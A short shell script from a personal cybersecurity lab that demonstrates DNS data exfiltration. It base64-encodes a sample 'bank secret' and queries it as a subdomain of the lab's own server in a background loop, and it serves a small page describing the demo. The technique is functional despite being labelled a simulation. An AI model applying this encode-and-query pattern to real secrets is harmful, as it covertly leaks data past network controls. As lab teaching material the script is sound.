#!/bin/sh
# Modulo 04 - Exfiltracion de datos por DNS - DEMOSTRACION CONTROLADA
# Laboratorio de Ciberseguridad de David Santiago Cantor Torres.
# Codifica un dato de ejemplo y lo consulta como subdominio del DMZ propio.
# Es una SIMULACION educativa: ningun dato real se transmite.
set -u

DMZ_HOST="${DMZ_HOST:-servidor-web-dmz-dscantor.onrender.com}"
PORT="${PORT:-8080}"
INTERVALO="${INTERVALO:-60}"
SECRETO="${SECRETO:-clave_secreta_banco_2026}"

demo() {
  echo "=============================================================="
  echo "[DNS] $(date '+%Y-%m-%d %H:%M:%S') Simulando exfiltracion por DNS"
  # Codifica el dato en base64 y lo deja apto para una etiqueta DNS.
  cod=$(printf '%s' "$SECRETO" | base64 | tr -d '=\n' | cut -c1-50)
  echo "[DNS] Dato de ejemplo: '$SECRETO' -> codificado: $cod"
  echo "[DNS] Consulta DNS: $cod.$DMZ_HOST"
  nslookup "$cod.$DMZ_HOST" 2>&1 | sed 's/^/[DNS] /'
  echo "[DNS] Consulta completada (simulacion)."
}

( while true; do demo; sleep "$INTERVALO"; done ) &

cat > /app/index.html <<HTML
<!doctype html><meta charset="utf-8"><title>Modulo 04 - Exfiltracion DNS - dscantor</title>
<body style="font-family:Arial;background:#0b0b1a;color:#fff;padding:40px">
<h1>Modulo 04 - Exfiltracion de datos por DNS (simulada)</h1>
<p>Laboratorio de Ciberseguridad de David Santiago Cantor Torres</p>
<p>Consulta DNS codificada cada $INTERVALO s hacia el dominio del DMZ.</p>
<p>Objetivo: $DMZ_HOST</p></body>
HTML

cd /app
exec python3 -m http.server "$PORT"
